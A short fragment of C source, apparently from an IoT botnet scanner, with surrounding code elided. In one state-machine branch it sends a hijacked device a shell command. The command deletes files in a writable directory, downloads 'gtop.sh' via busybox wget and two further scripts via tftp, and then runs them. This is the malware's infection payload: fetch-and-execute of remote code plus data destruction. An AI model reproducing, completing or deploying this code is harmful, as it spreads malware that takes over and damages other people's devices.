			...
			case 8:
				{
					...
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://0.0.0.0/gtop.sh;sh gtop.sh;busybox tftp -r tftp1.sh -g ; sh tftp1.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh;;exit\r\n", 275, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
